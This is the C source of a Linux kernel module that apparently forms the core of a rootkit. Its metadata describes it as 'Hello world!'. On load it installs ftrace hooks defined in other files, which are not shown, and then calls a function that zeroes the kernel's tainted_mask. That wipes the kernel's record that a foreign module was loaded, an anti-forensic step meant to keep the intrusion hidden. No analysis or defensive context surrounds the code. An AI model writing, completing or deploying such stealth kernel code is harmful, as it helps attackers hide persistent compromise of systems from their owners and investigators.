#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "hooks/all.h"
#include "utils/ftrace_helper.h"

// Specify module information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("bah");
MODULE_DESCRIPTION("Hello world!");
MODULE_VERSION("1.0");


/* Remove taint flags from the kernel. */
void untaint_kernel(void)
{
    unsigned long* tainted_mask = (unsigned long *)resolve_sym("tainted_mask");
    *tainted_mask = 0;
}


/* Module initialization function */
static int hello_init(void)
{
    /* Simply call fh_install_hooks() with hooks (defined above) */
    int err;
    err = install_hooks();
    if(err)
        return err;
    printk(KERN_INFO "Loading\n");
    
    untaint_kernel();

    return 0;
}


// Function called when the module is unloaded from the system
static void hello_exit(void) {
    printk(KERN_INFO "Unloading\n");
    remove_hooks();
}


module_init(hello_init);
module_exit(hello_exit);
